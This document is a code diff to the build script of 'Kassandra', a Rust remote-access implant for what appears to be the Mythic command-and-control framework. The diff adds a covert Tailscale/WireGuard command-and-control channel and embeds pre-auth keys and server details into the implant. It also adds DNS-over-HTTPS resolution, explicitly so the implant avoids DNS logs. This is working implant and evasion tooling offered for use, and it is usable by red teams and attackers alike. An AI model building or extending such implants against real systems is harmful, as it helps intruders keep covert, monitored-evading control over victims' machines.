@@ -20,9 +20,12 @@ class KassandraAgent(PayloadType):
     wrapped_payloads = []                                             # If wrapper, list of wrapper payloads to use
     note = """Basic Implant in Rust"""                                   # Description
     supports_dynamic_loading = False                                  # Support of dynamic code loading
-    c2_profiles = ["http", "s3_storage"]                              # Listener types
+    c2_profiles = ["http", "s3_storage", "tailscale"]                  # Listener types
     c2_parameter_deviations = {
         "s3_storage": {
+            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
+        },
+        "tailscale": {
             "encrypted_exchange_check": C2ParameterDeviation(supported=False),
         }
     }
@@ -41,7 +44,27 @@ class KassandraAgent(PayloadType):
             parameter_type=BuildParameterType.String,
             description="Chunk size in bytes for upload/download",
             default_value="4096"
-        )
+        ),
+        BuildParameter(
+            name="tailscale_protocol",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["http", "tcp"],
+            default_value="http",
+            description="Agent-to-C2 transport inside the WireGuard tunnel: http (compatible) or tcp (lower overhead)",
+        ),
+        BuildParameter(
+            name="doh",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["off", "cloudflare", "google", "custom"],
+            default_value="off",
+            description="DNS-over-HTTPS: resolve Tailscale hostnames via DoH to avoid DNS logs",
+        ),
+        BuildParameter(
+            name="doh_url",
+            parameter_type=BuildParameterType.String,
+            default_value="",
+            description="Custom DoH resolver URL (only used when doh=custom, e.g. https://dns.example.com/dns-query)",
+        ),
     ]                                             # Array if we want custom parameters during build
     agent_path = pathlib.Path(".") / "Kassandra"                           # Path of Kassandra
     agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"     # Path of the icon
@@ -76,6 +99,10 @@ class KassandraAgent(PayloadType):
         s3_config = None
         use_s3 = False
         enc_key = None
+
+        # Tailscale config (populated if tailscale C2 profile is selected)
+        ts_config = None
+        use_tailscale = False
 
         stdout_err = ""
         for c2 in self.c2info:
@@ -116,6 +143,39 @@ class KassandraAgent(PayloadType):
 
                 s3_config = config_data.Result
 
+            elif profile_name == "tailscale":
+                use_tailscale = True
+                params = c2.get_parameters_dict()
+                Config["callback_interval"] = params.get("callback_interval", "5")
+                Config["callback_jitter"] = params.get("callback_jitter", "10")
+
+                # Handle AESPSK parameter
+                aespsk_param = params.get("AESPSK", None)
+                enc_key = None
+                if isinstance(aespsk_param, dict):
+                    if aespsk_param.get("value") == "aes256_hmac":
+                        enc_key = aespsk_param.get("enc_key", None)
+                elif isinstance(aespsk_param, str) and aespsk_param not in ("none", ""):
+                    enc_key = aespsk_param
+
+                # Call tailscale generate_config RPC to get pre-auth key
+                config_data = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
+                    ServiceName="tailscale",
+                    ServiceRPCFunction="generate_config",
+                    ServiceRPCFunctionArguments={
+                        "payload_uuid": self.uuid,
+                        "killdate": params.get("killdate", ""),
+                        "enc_key": enc_key,
+                    }
+                ))
+
+                if not config_data.Success:
+                    resp.status = BuildStatus.Error
+                    resp.build_stderr = f"Tailscale provisioning failed: {config_data.Error}"
+                    return resp
+
+                ts_config = json.loads(config_data.Result) if isinstance(config_data.Result, str) else config_data.Result
+
             elif profile_name == "http":
                 for key, val in c2.get_parameters_dict().items():
                     if isinstance(val, dict) and 'enc_key' in val:
@@ -141,7 +201,22 @@ class KassandraAgent(PayloadType):
             ))
 
         # Report C2 provisioning
-        if use_s3 and s3_config:
+        if use_tailscale and ts_config:
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Provisioning C2",
+                StepStdout=(
+                    f"Tailscale C2 provisioned\n"
+                    f"Control URL: {ts_config['control_url']}\n"
+                    f"Server Hostname: {ts_config['server_hostname']}\n"
+                    f"Server Port: {ts_config['server_port']}\n"
+                    f"Auth Key: {ts_config['auth_key'][:12]}...\n"
+                    f"Protocol: {self.get_parameter('tailscale_protocol').upper()}\n"
+                    f"Transport: Embedded tsnet via Go FFI"
+                ),
+                StepSuccess=True,
+            ))
+        elif use_s3 and s3_config:
             key_preview = s3_config["access_key_id"][:8] + "..."
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -184,6 +259,26 @@ class KassandraAgent(PayloadType):
             content = content.replace("%CHUNKSIZE%", str(self.get_parameter("chunk_size")))
             content = content.replace("%SSL%", "true" if Config.get("ssl") else "false")
             content = content.replace("%PROXYENABLED%", "true" if Config.get("proxyEnabled") else "false")
+
+            # Tailscale config stamping
+            if use_tailscale and ts_config:
+                content = content.replace("%USE_TAILSCALE%", "true")
+                content = content.replace("%TS_AUTH_KEY%", ts_config["auth_key"])
+                content = content.replace("%TS_CONTROL_URL%", ts_config["control_url"])
+                content = content.replace("%TS_SERVER_HOSTNAME%", ts_config["server_hostname"])
+                content = content.replace("%TS_SERVER_PORT%", ts_config["server_port"])
+                content = content.replace("%TS_PROTOCOL%", self.get_parameter("tailscale_protocol"))
+                content = content.replace("%TS_TCP_PORT%", ts_config.get("tcp_port", ""))
+                content = content.replace("%TS_DOH_URL%", _resolve_doh_url(self.get_parameter("doh"), self.get_parameter("doh_url")))
+            else:
+                content = content.replace("%USE_TAILSCALE%", "false")
+                content = content.replace("%TS_AUTH_KEY%", "")
+                content = content.replace("%TS_CONTROL_URL%", "")
+                content = content.replace("%TS_SERVER_HOSTNAME%", "")
+                content = content.replace("%TS_SERVER_PORT%", "")
+                content = content.replace("%TS_PROTOCOL%", "http")
+                content = content.replace("%TS_TCP_PORT%", "")
+                content = content.replace("%TS_DOH_URL%", "")
 
             # S3 config stamping
             if use_s3 and s3_config:
@@ -287,6 +382,18 @@ class KassandraAgent(PayloadType):
         resp.payload = open(newName, "rb").read()
         return resp
 
+
+
+_DOH_URLS = {
+    "off": "",
+    "cloudflare": "https://1.1.1.1/dns-query",
+    "google": "https://8.8.8.8/dns-query",
+}
+
+def _resolve_doh_url(choice, custom_url=""):
+    if choice == "custom":
+        return custom_url
+    return _DOH_URLS.get(choice, "")
 
 
 def generate_self_signed_cert(name="mycodecert", password="infected"):
